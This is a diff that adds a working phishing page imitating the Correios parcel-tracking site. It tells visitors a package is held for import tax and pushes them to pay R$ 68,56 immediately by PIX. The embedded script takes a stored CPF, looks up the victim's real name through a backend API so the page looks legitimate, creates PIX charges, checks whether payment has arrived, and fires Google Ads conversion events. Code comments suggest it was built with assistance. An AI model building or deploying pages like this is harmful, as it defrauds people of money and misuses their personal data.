@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Correios | Rastreamento</title>
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/bootstrap.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/app.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/yellow.css">
+    <link rel="stylesheet" href="Correios%20_%20Rastreio_arquivos/all.css" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="css/all.css">
+    <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17852819586"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'AW-17852819586');
+    </script>
+</head>
+
+<body>
+    <header class="w-100 font-size-16 font-weight-400 text-blue">
+        <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
+            <a href="#" class="text-blue text-decoration-none">
+                Acessibilidade <span class="ml-1" style="font-size: 10px;">&#9660;</span>
+            </a>
+        </div>
+        <div class="">
+            <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
+                style="height:48px">
+                <div class="menu-toggle" id="menu-toggle" style="width:50px">
+                    <div class="bar"></div>
+                    <div class="bar"></div>
+                    <div class="bar"></div>
+                </div>
+                <div class="d-flex justify-content-center position-absolute w-100"
+                    style="left: 0; pointer-events: none;">
+                    <a href="#" class="py-2" style="pointer-events: auto;">
+                        <img src="Correios%20_%20Rastreio_arquivos/correios.png" alt="" height="25">
+                    </a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000"
+            style="margin: 0 auto;">
+            <span class="text-blue mr-2">Portal Correios</span>
+            <span class="text-blue mr-2">&rsaquo;</span>
+            <span class="text-blue mr-2">Rastreamento</span>
+            <span class="text-blue mr-2">&rsaquo;</span>
+        </nav>
+
+        <section class="mt-4 px-2 w-95 max-w-1000" style="margin:0 auto;">
+            <h4 class="text-danger font-weight-bold">
+                <img src="Correios%20_%20Rastreio_arquivos/icon-alert.png" alt="Alerta"
+                    style="width: 25px; vertical-align: middle;" class="mr-2">
+                SUA ENCOMENDA FOI TRIBUTADA!
+            </h4>
+
+            <h5 class="text-blue-dark font-weight-bold mt-4">STATUS DA ENTREGA:</h5>
+            <h5 class="text-warning font-weight-bold">● AGUARDANDO PAGAMENTO</h5>
+
+            <p class="mt-3 text-blue-dark">
+                Sua encomenda está retida na agência dos correios em CURITIBA-PR
+            </p>
+
+            <p class="text-blue-dark">
+                Para liberar o envio da sua encomenda, clique no botão abaixo. É recomendado que o pagamento seja feito
+                de imediato para evitar aumento das tarifas postais de armazenagem!
+            </p>
+
+            <a href="#" id="payButton" class="btn btn-primary btn-block text-uppercase font-weight-bold mt-4">CLIQUE
+                AQUI PARA
+                LIBERAÇÃO DA SUA ENCOMENDA</a>
+        </section>
+
+        <section class="mt-4 px-2 w-95 max-w-1000" style="margin:0 auto;">
+            <div class="border border-dark p-3">
+                <div class="d-flex align-items-center mb-3 border-bottom border-dark pb-2">
+                    <img src="Correios%20_%20Rastreio_arquivos/receita-federal.png" alt="Receita Federal"
+                        style="height: 40px;" class="mr-3">
+                    <span class="font-weight-400 text-dark">TRIBUTAÇÃO FEDERAL DEVIDA</span>
+                </div>
+
+                <p class="mb-1"><strong>Nome:</strong> <span id="taxPageName">Carregando...</span></p>
+                <p class="mb-3"><strong>CPF:</strong> <span id="taxPageCPF"></span></p>
+
+                <div class="d-flex justify-content-between mb-2">
+                    <span>Imposto de Importação</span>
+                    <span>R$ 33,78</span>
+                </div>
+                <div class="d-flex justify-content-between mb-2">
+                    <span>Imposto sobre circulação de mercadorias e serviços</span>
+                    <span>R$ 23,65</span>
+                </div>
+                <div class="d-flex justify-content-between mb-3">
+                    <span>Serviços Postais</span>
+                    <span>R$ 11,13</span>
+                </div>
+
+                <div class="d-flex justify-content-between mb-3 font-weight-bold">
+                    <span>Total</span>
+                    <span>R$ 68,56</span>
+                </div>
+
+                <div class="d-flex justify-content-between mb-1">
+                    <span>Data de Emissão</span>
+                    <span>01/02/2026</span>
+                </div>
+                <div class="d-flex justify-content-between font-weight-bold">
+                    <span>Data de Vencimento</span>
+                    <span>04/02/2026</span>
+                </div>
+            </div>
+        </section>
+        <section class="mt-4 px-2 w-95 max-w-1000" style="margin:0 auto;">
+            <div class="p-3">
+                <ul class="list-unstyled position-relative"
+                    style="border-left: 2px solid #ffce00; margin-left: 20px; padding-left: 30px;">
+
+                    <!-- Previsão de Entrega -->
+                    <li class="mb-5 position-relative">
+                        <div class="position-absolute bg-white rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                            <img src="Correios%20_%20Rastreio_arquivos/correios-previsao.png" alt="Correios"
+                                style="width: 35px;">
+                        </div>
+                        <h6 class="font-weight-bold text-blue-dark mb-1">Previsão de Entrega</h6>
+                        <p class="text-secondary font-size-14 mb-0">3 dias após o pagamento</p>
+                    </li>
+
+                    <!-- Aguardando Pagamento -->
+                    <li class="mb-5 position-relative">
+                        <div class="position-absolute bg-white rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                            <img src="Correios%20_%20Rastreio_arquivos/icon-dollar.png" alt="" style="width: 30px;">
+                        </div>
+                        <h6 class="font-weight-bold text-blue-dark mb-1">Objeto aguardando pagamento</h6>
+                        <p class="text-secondary font-size-14 mb-0">em Unidade de Fiscalização Aduaneira, Curitiba, PR
+                        </p>
+                        <p class="text-blue-dark font-weight-bold font-size-14 mb-0">Realize o pagamento: <a href="#"
+                                id="payButtonTimeline" class="text-blue">Efetuar Pagamento</a></p>
+                    </li>
+
+                    <!-- Em transferência (Curitiba) -->
+                    <li class="mb-5 position-relative">
+                        <div class="position-absolute bg-white rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                            <img src="Correios%20_%20Rastreio_arquivos/icon-truck.png" alt="" style="width: 30px;">
+                        </div>
+                        <h6 class="font-weight-bold text-blue-dark mb-1">Objeto em transferência - por favor aguarde
+                        </h6>
+                        <p class="text-secondary font-size-14 mb-0">de Unidade de Tratamento, Curitiba, PR</p>
+                        <p class="text-secondary font-size-14 mb-0">para Unidade de Fiscalização Aduaneira - Curitiba,
+                            PR</p>
+                    </li>
+
+                    <!-- Recebido no Brasil -->
+                    <li class="mb-5 position-relative">
+                        <div class="position-absolute bg-white rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                            <img src="Correios%20_%20Rastreio_arquivos/icon-dolly.png" alt="" style="width: 30px;">
+                        </div>
+                        <h6 class="font-weight-bold text-blue-dark mb-1">Objeto recebido em território nacional</h6>
+                        <p class="text-secondary font-size-14 mb-0">Curitiba - PR</p>
+                    </li>
+
+                    <!-- Em transferência (China) -->
+                    <li class="mb-5 position-relative">
+                        <div class="position-absolute bg-white rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                            <img src="Correios%20_%20Rastreio_arquivos/icon-truck.png" alt="" style="width: 30px;">
+                        </div>
+                        <h6 class="font-weight-bold text-blue-dark mb-1">Objeto em transferência - por favor aguarde
+                        </h6>
+                        <p class="text-secondary font-size-14 mb-0">de Unidade de Tratamento, Shanghai - China</p>
+                        <p class="text-secondary font-size-14 mb-0">para Unidade de Tratamento Internacional, China</p>
+                    </li>
+
+                    <!-- Objeto Postado -->
+                    <li class="position-relative">
+                        <div class="position-absolute bg-white rounded-circle d-flex align-items-center justify-content-center"
+                            style="width: 50px; height: 50px; left: -56px; top: -5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                            <img src="Correios%20_%20Rastreio_arquivos/icon-box.png" alt="" style="width: 30px;">
+                        </div>
+                        <h6 class="font-weight-bold text-blue-dark mb-1">Objeto Postado</h6>
+                        <p class="text-secondary font-size-14 mb-0">Shanghai - China</p>
+                    </li>
+
+                </ul>
+            </div>
+        </section>
+
+        <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
+            <div>
+                <img src="Correios%20_%20Rastreio_arquivos/banner-1.jpg" alt="" class="w-100">
+            </div>
+        </section>
+
+        <!-- PIX Modal -->
+        <div class="modal fade" id="pixModal" tabindex="-1" role="dialog" aria-labelledby="pixModalLabel"
+            aria-hidden="true" style="background-color: rgba(0,0,0,0.5); display: none;">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+                <div class="modal-content" style="border: none; box-shadow: 0 5px 15px rgba(0,0,0,0.3);">
+                    <div class="modal-header"
+                        style="background-color: #003157; color: white; border-bottom: 4px solid #FFE600;">
+                        <h5 class="modal-title font-weight-bold" id="pixModalLabel">
+                            <img src="Correios%20_%20Rastreio_arquivos/correios.png" alt="Correios" height="25"
+                                class="mr-2" style="filter: brightness(0) invert(1);">
+                            Pagamento via PIX
+                        </h5>
+                        <button type="button" class="close text-white" onclick="closePixModal()" aria-label="Close"
+                            style="opacity: 1;">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body text-center pt-4">
+                        <p class="text-blue-dark font-weight-bold mb-3">Escaneie o QR Code abaixo para finalizar:</p>
+
+                        <div id="pixQrCodeContainer" class="mb-4 p-2 d-inline-block"
+                            style="border: 2px solid #EFEDEA; border-radius: 8px;">
+                            <!-- QR Code Image will be inserted here -->
+                        </div>
+
+                        <div class="form-group text-left">
+                            <label for="pixCopyPaste" class="text-blue-dark font-size-14 font-weight-bold">Código PIX
+                                Copia e Cola:</label>
+                            <div class="input-group">
+                                <input type="text" class="form-control" id="pixCopyPaste" readonly
+                                    style="font-size: 13px; background-color: #F5F3F0; border-color: #ced4da;">
+                                <div class="input-group-append">
+                                    <button class="btn" type="button" onclick="copyPixCode()"
+                                        style="background-color: #277AB8; color: white; border: 1px solid #277AB8; font-weight: bold;">
+                                        Copiar
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="copySuccess" class="alert alert-success mt-2 py-1 font-size-14"
+                            style="display: none; background-color: #d4edda; border-color: #c3e6cb; color: #155724;">
+                            Código copiado com sucesso!
+                        </div>
+
+                        <div class="text-left mt-3 p-3" style="background-color: #F5F3F0; border-radius: 5px;">
+                            <h6 class="font-weight-bold text-blue-dark mb-2 font-size-14">Como pagar:</h6>
+                            <ol class="pl-3 mb-0 text-secondary font-size-13" style="line-height: 1.6;">
+                                <li>Abra o aplicativo do seu banco;</li>
+                                <li>Escolha a opção <strong>Pix</strong>;</li>
+                                <li>Selecione <strong>Ler QR Code</strong> ou <strong>Pix Copia e Cola</strong>;</li>
+                                <li>Escaneie o código ou cole a chave copiada acima;</li>
+                                <li>Confirme os dados e finalize o pagamento.</li>
+                            </ol>
+                        </div>
+
+                        <div class="mt-3 text-secondary font-size-12">
+                            <p class="mb-0">Após o pagamento, a liberação ocorre em até 30 minutos.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            function closePixModal() {
+                document.getElementById('pixModal').style.display = 'none';
+                document.getElementById('pixModal').classList.remove('show');
+            }
+
+            function copyPixCode() {
+                const copyText = document.getElementById("pixCopyPaste");
+                copyText.select();
+                copyText.setSelectionRange(0, 99999);
+                document.execCommand("copy");
+
+                const successMsg = document.getElementById('copySuccess');
+                successMsg.style.display = 'block';
+                setTimeout(() => { successMsg.style.display = 'none'; }, 2000);
+            }
+
+            document.addEventListener('DOMContentLoaded', function () {
+                const cep = localStorage.getItem('userCEP');
+                const cpf = localStorage.getItem('userCPF');
+
+                if (cpf) {
+                    const cpfElement = document.getElementById('taxPageCPF');
+                    if (cpfElement) {
+                        cpfElement.textContent = cpf;
+                    }
+
+                    fetch('/api/consult-cpf', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ cpf: cpf })
+                    })
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Network response was not ok');
+                            }
+                            return response.json();
+                        })
+                        .then(data => {
+                            console.log('CPF Data:', data);
+
+                            // Extract name from Dtrack or Legendary structure
+                            const realName = (data.consulta && data.consulta.cadastral && data.consulta.cadastral.nome) ||
+                                (data.pessoa && data.pessoa.NOME) ||
+                                (data.pessoa && data.pessoa.nome) ||
+                                data.nome ||
+                                data.name;
+
+                            if (realName) {
+                                // Update displayed name
+                                const nameEl = document.getElementById('taxPageName');
+                                if (nameEl) {
+                                    nameEl.textContent = realName;
+                                } else {
+                                    // Fallback for safety
+                                    const nameLabel = Array.from(document.querySelectorAll('strong')).find(el => el.textContent.includes('Nome:'));
+                                    if (nameLabel) nameLabel.parentElement.innerHTML = `<strong>Nome:</strong> ${realName}`;
+                                }
+
+                                // Store for PIX payment
+                                localStorage.setItem('userName', realName);
+                            } else {
+                                throw new Error('Nome não encontrado no retorno');
+                            }
+                        })
+                        .catch(e => {
+                            console.error('Erro ao consultar CPF:', e);
+                            const fallbackName = localStorage.getItem('userName') || "Destinatário";
+                            const nameEl = document.getElementById('taxPageName');
+                            if (nameEl) {
+                                nameEl.textContent = fallbackName;
+                            } else {
+                                const nameLabel = Array.from(document.querySelectorAll('strong')).find(el => el.textContent.includes('Nome:'));
+                                if (nameLabel) nameLabel.parentElement.innerHTML = `<strong>Nome:</strong> ${fallbackName}`;
+                            }
+                        });
+                }
+
+                if (cep) {
+                    const cleanCep = cep.replace(/\D/g, '');
+                    if (cleanCep.length === 8) {
+                        fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (!data.erro) {
+                                    const addressText = `${data.localidade} - ${data.uf}`;
+                                    // Update Curitiba elements to user's address where appropriate
+
+                                    // Example: Update "Unidade de Tratamento, Curitiba, PR" to destination
+                                    // finding elements by content is tricky without IDs, but let's try to update specific parts
+                                    // For now, let's assume the user wants to see their city in the "Recebido no Brasil" or similar steps?
+                                    // Or maybe just the destination. 
+
+                                    // Let's replace the last "Curitiba - PR" occurrence which usually implies destination/local unit
+                                    // Actually, typically import flow is: 
+                                    // 1. Posted (China)
+                                    // 2. Transfer (China -> Brazil)
+                                    // 3. Received (Curitiba - import center)
+                                    // 4. Transfer (Curitiba -> Destination)
+                                    // 5. Awaiting Payment (Curitiba - Customs)
+
+                                    // So actually, "Curitiba" is correct for most steps in an import tax context!
+                                    // BUT the user asked to "adapt the site". 
+                                    // Maybe they want the "Destination" to be their city?
+                                    // Let's add a "Destino: Cidade - UF" somewhere or update the "Previsão de Entrega" context.
+
+                                    // However, simpler interpretation: Replace static "Curitiba - PR" with user city 
+                                    // IF it makes sense. But for tax, it's usually in Curitiba.
+                                    // I'll update the "Previsão de Entrega" description to include the city.
+
+                                    const prevEntrega = document.querySelector('li:nth-child(1) p');
+                                    if (prevEntrega) {
+                                        prevEntrega.innerHTML = `Para: ${addressText}<br>3 dias após o pagamento`;
+                                    }
+                                }
+                            })
+                            .catch(err => console.error('Erro ao buscar CEP:', err));
+                    }
+                }
+
+                // PIX Payment Handler
+                function initiatePixPayment(e) {
+                    e.preventDefault();
+                    const clickedBtn = e.currentTarget;
+                    const originalText = clickedBtn.textContent || 'Efetuar Pagamento';
+
+                    const userName = localStorage.getItem('userName') || "Cliente";
+                    const cpf = localStorage.getItem('userCPF');
+
+                    clickedBtn.textContent = 'Gerando PIX...';
+                    clickedBtn.style.pointerEvents = 'none';
+                    clickedBtn.style.opacity = '0.7';
+
+                    fetch('/api/create-pix', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            name: userName,
+                            cpf: cpf
+                        })
+                    })
+                        .then(response => {
+                            if (!response.ok) {
+                                if (response.status === 404) {
+                                    alert('ATENÇÃO: O servidor precisa ser reiniciado para reconhecer o pagamento!\n\nPor favor, vá no terminal:\n1. Aperte CTRL + C\n2. Rode "node server.js" novamente\n3. Atualize esta página.');
+                                    throw new Error('Servidor desatualizado (404)');
+                                }
+                                return response.text().then(text => {
+                                    throw new Error(`Erro no servidor: ${response.status} - ${text}`);
+                                });
+                            }
+                            return response.json();
+                        })
+                        .then(data => {
+                            // 1. Get the main payload (handling potential {data: ...} wrapper)
+                            const payload = data.data || data;
+
+                            // 2. Get the payment info (handling potential {paymentData: ...} wrapper)
+                            const paymentInfo = payload.paymentData || payload;
+
+                            // 3. Extract the PIX string
+                            const pixCode = paymentInfo.qrCode || paymentInfo.copyPaste || paymentInfo.paymentCode || payload.copyPaste || payload.pix_copy_paste;
+                            const transactionId = payload.uuid || payload.id || paymentInfo.uuid || paymentInfo.id; // Try to find ID
+
+                            console.log('Payload:', payload);
+                            console.log('PaymentInfo:', paymentInfo);
+                            console.log('Detected PIX Code:', pixCode);
+                            console.log('Transaction ID:', transactionId);
+
+                            if (pixCode) {
+                                const modal = document.getElementById('pixModal');
+                                const qrContainer = document.getElementById('pixQrCodeContainer');
+                                const copyInput = document.getElementById('pixCopyPaste');
+
+                                // Use external service to generate QR code image from the text string
+                                qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}" alt="QR Code PIX" style="max-width: 250px;">`;
+
+                                copyInput.value = pixCode;
+
+                                modal.classList.add('show');
+                                modal.style.display = 'block';
+
+                                // --- POLLING FOR PAYMENT STATUS ---
+                                if (transactionId) {
+                                    const pollInterval = setInterval(() => {
+                                        fetch(`/api/check-payment?id=${transactionId}`)
+                                            .then(res => res.json())
+                                            .then(statusData => {
+                                                console.log('Payment Status:', statusData);
+                                                // Check for various potential success statuses
+                                                const status = (statusData.status || statusData.state || '').toUpperCase();
+
+                                                if (status === 'PAID' || status === 'APPROVED' || status === 'COMPLETED' || status === 'SUCCEEDED') {
+                                                    clearInterval(pollInterval);
+
+                                                    // FIRING GOOGLE ADS CONVERSION
+                                                    if (typeof gtag === 'function') {
+                                                        gtag('event', 'conversion', {
+                                                            'send_to': 'AW-17852819586/3yvGCPHY49wbEILR8cBC',
+                                                            'transaction_id': transactionId
+                                                        });
+                                                        console.log('Google Ads Conversion Event Fired!');
+                                                    }
+
+                                                    alert('Pagamento Confirmado! Sua encomenda foi liberada.');
+                                                    // Redirect to the success page
+                                                    location.href = 'obrigado.html';
+                                                }
+                                            })
+                                            .catch(err => console.error('Error polling payment:', err));
+                                    }, 5000); // Check every 5 seconds
+                                }
+
+                            } else {
+                                alert('Erro ao gerar PIX: O servidor respondeu, mas não encontrei o código PIX.');
+                                console.error('Dados completos:', data);
+                            }
+                        })
+                        .catch(err => {
+                            console.error('Erro detalhado:', err);
+                            alert(`Falha na comunicação: ${err.message}`);
+                        })
+                        .finally(() => {
+                            clickedBtn.textContent = originalText;
+                            clickedBtn.style.pointerEvents = 'auto';
+                            clickedBtn.style.opacity = '1';
+                        });
+                }
+
+                // ATTACH EVENT LISTENERS
+                const payButton = document.getElementById('payButton');
+                if (payButton) {
+                    payButton.addEventListener('click', initiatePixPayment);
+                }
+
+                const payButtonTimeline = document.getElementById('payButtonTimeline');
+                if (payButtonTimeline) {
+                    payButtonTimeline.addEventListener('click', initiatePixPayment);
+                }
+
+                // Port Check
+                if (window.location.port === '4001') {
+                    const body = document.querySelector('body');
+                    const overlay = document.createElement('div');
+                    overlay.style.position = 'fixed';
+                    overlay.style.top = '0';
+                    overlay.style.left = '0';
+                    overlay.style.width = '100%';
+                    overlay.style.height = '100%';
+                    overlay.style.backgroundColor = 'rgba(0,0,0,0.95)';
+                    overlay.style.zIndex = '9999';
+                    overlay.style.display = 'flex';
+                    overlay.style.flexDirection = 'column';
+                    overlay.style.alignItems = 'center';
+                    overlay.style.justifyContent = 'center';
+                    overlay.style.color = 'white';
+                    overlay.style.textAlign = 'center';
+
+                    overlay.innerHTML = `
+                        <h1 style="color: #ffce00; margin-bottom: 20px;">⚠️ VOCÊ ESTÁ NO ENDEREÇO ANTIGO ⚠️</h1>
+                        <p style="font-size: 18px; max-width: 600px;">Você precisa acessar a nova versão do servidor para o pagamento funcionar.</p>
+                        <p style="font-size: 18px; max-width: 600px;">Se você já reiniciou o terminal, clique no botão abaixo:</p>
+                        <a href="http://localhost:4002/taxa.html" style="background-color: #28a745; color: white; padding: 15px 30px; text-decoration: none; font-weight: bold; font-size: 20px; border-radius: 5px; margin-top: 20px;">IR PARA O NOVO SITE (PORTA 4002)</a>
+                        <p style="margin-top: 30px; opacity: 0.7;">Se o link acima não funcionar, certifique-se de ter reiniciado o servidor com 'node server.js'.</p>
+                    `;
+
+                    body.appendChild(overlay);
+                    // Prevent scrolling
+                    body.style.overflow = 'hidden';
+                }
+            });
+        </script>
+
+        <style>
+            @media (max-width: 768px) {
+
+                /* Adjust timeline for mobile */
+                ul.list-unstyled {
+                    margin-left: 50px !important;
+                    /* Increase margin to fit icons */
+                }
+
+                /* Ensure banner is responsive */
+                img.w-100 {
+                    height: auto;
+                }
+
+                /* Adjust text sizes if needed */
+                h4 {
+                    font-size: 1.2rem;
+                }
+
+                /* Make breadcrumb wrap nicely */
+                nav.d-flex {
+                    flex-wrap: wrap;
+                }
+            }
+        </style>
+    </main>
+
+    <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark mt-5">
+        <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+            <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+            <ul>
+                <li class="mb-2 font-size-14">
+                    <i class="fas fa-desktop"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Registro de Manifestações</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-question-square mr-1"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Central de Atendimento</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-briefcase"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Solucões para o seu negócio</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-headset"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Suporte ao cliente com contrato</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-comment-alt-dots"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Ouvidoria</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-user-headset"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Denúncia</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+            <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>
+            <ul>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-address-card"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Identidade colaborativa</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-user-graduate"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Educação e cultura</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-book-alt"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span>Código de ética</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-search"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Transparência e prestação de contas</span>
+                    </a>
+                </li>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-comment-alt-dots"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Política de privacidade e Notas legais</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+            <h5 class="font-weight-700 mb-4">Outros Sites</h5>
+            <ul>
+                <li class="mb-2 font-size-14">
+                    <i class="far fa-shopping-cart"></i>
+                    <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+                        <span class="text-wrap">Loja online dos correios</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
+            <span>© Copyright 2026 Correios</span>
+        </div>
+    </footer>
+</body>
+
+</html>
